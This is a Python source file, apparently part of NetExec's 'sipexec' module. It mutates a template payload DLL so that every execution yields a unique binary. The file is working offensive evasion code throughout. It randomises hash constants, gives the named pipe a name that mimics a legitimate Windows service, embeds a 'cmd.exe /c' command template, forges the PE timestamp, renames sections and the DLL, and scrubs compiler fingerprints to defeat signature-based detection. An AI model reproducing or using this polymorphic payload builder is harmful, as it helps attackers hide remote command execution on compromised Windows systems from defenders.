"""Polymorphic DLL patcher for NXC sipexec — unique binary per execution."""
import os
import random
import struct
import string

from nxc.paths import DATA_PATH

TEMPLATE_PATH = os.path.join(DATA_PATH, "sipexec_payload_poly.dll")

_MARKERS = {
    "pipe_fmt":  b"POLY_PIPE_FMT__",
    "done":      b"POLY_DONE______",
    "cmd_fmt":   b"POLY_CMD_FMT___",
    "greet_fmt": b"POLY_GREET_FMT_",
}
_FIELD_SIZES = {"pipe_fmt": 64, "done": 32, "cmd_fmt": 64, "greet_fmt": 64}
_FNV_SEED_SENTINEL = struct.pack("<I", 0xDEAD0001)
_FNV_PRIME_SENTINEL = struct.pack("<I", 0xDEAD0002)

_COMPILER_SIGS = [
    b"GCC: (GNU)", b"Mingw-w64 runtime failure:", b"libgcc_s_dw2-1.dll",
    b"Unknown pseudo relocation protocol version", b"Unknown pseudo relocation bit size",
    b"pseudo relocation at %p out of range", b"runtime error %d",
]


def _rand_alnum(n):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def mutate(template_path=None):
    """Returns (dll_bytes, done_marker, fnv_seed, fnv_prime)."""
    path = template_path or TEMPLATE_PATH
    with open(path, "rb") as f:
        dll = bytearray(f.read())

    # FNV constants
    fnv_seed = random.randint(0x10000000, 0xFFFFFFFF)
    fnv_prime = random.choice([16777619, 16777259, 16777289, 16777213])
    seed_off = dll.find(_FNV_SEED_SENTINEL)
    prime_off = dll.find(_FNV_PRIME_SENTINEL)
    if seed_off < 0 or prime_off < 0:
        raise ValueError("FNV sentinel markers not found")
    struct.pack_into("<I", dll, seed_off, fnv_seed)
    struct.pack_into("<I", dll, prime_off, fnv_prime)

    # Strings
    pipe_prefix = random.choice(["wkssvc", "spoolss", "lsarpc", "samr", "netlogon", "srvsvc", "winspool", "epmapper", "browser"])
    done_tag = _rand_alnum(6)
    done_marker = f"\n[{done_tag}]\n".encode()
    patches = {
        "pipe_fmt": f"{pipe_prefix}_%08x".encode(),
        "done": done_marker,
        "cmd_fmt": b"cmd.exe /c %s",
        "greet_fmt": random.choice([b"OK %lu imp=%d\n", b"RDY %lu t=%d\n", b"+ %lu %d\n", b"ACK %lu i=%d\n"]),
    }
    for key, content in patches.items():
        off = dll.find(_MARKERS[key])
        if off < 0:
            raise ValueError(f"Marker {key} not found")
        co = off + 15
        cl = _FIELD_SIZES[key] - 15
        dll[co:co + cl] = b"\x00" * cl
        dll[co:co + len(content)] = content

    # PE timestamp
    pe_sig_off = struct.unpack_from("<I", dll, 0x3C)[0]
    struct.pack_into("<I", dll, pe_sig_off + 8, random.randint(0x50000000, 0x70000000))

    # Section names
    opt_hdr_size = struct.unpack_from("<H", dll, pe_sig_off + 20)[0]
    num_sections = struct.unpack_from("<H", dll, pe_sig_off + 6)[0]
    section_off = pe_sig_off + 24 + opt_hdr_size
    keep = {b".text\x00\x00\x00", b".reloc\x00\x00", b".idata\x00\x00", b".edata\x00\x00"}
    for i in range(num_sections):
        s_off = section_off + i * 40
        if bytes(dll[s_off:s_off + 8]) in keep:
            continue
        dll[s_off:s_off + 8] = ("." + _rand_alnum(6) + "\x00").encode()[:8]

    # Internal DLL name
    for old in [b"sipexec_payload_poly.dll", b"wtsvc.dll"]:
        idx = dll.find(old)
        if idx >= 0:
            new = (_rand_alnum(8) + ".dll").encode()
            dll[idx:idx + len(old)] = b"\x00" * len(old)
            dll[idx:idx + len(new)] = new
            break

    # Strip compiler fingerprints
    for sig in _COMPILER_SIGS:
        while True:
            idx = dll.find(sig)
            if idx < 0:
                break
            dll[idx:idx + len(sig)] = bytes(random.randint(0x20, 0x7E) for _ in range(len(sig)))

    return bytes(dll), done_marker, fnv_seed, fnv_prime


def derive_pipe_name(dll_basename, fnv_seed, fnv_prime, pipe_fmt=None):
    name = dll_basename.lower()
    h = fnv_seed
    for ch in name.encode("ascii", errors="ignore"):
        h ^= ch
        h = (h * fnv_prime) & 0xFFFFFFFF
    fmt = pipe_fmt.decode().rstrip("\x00") if pipe_fmt else "wkssvc_%08x"
    return fmt % h
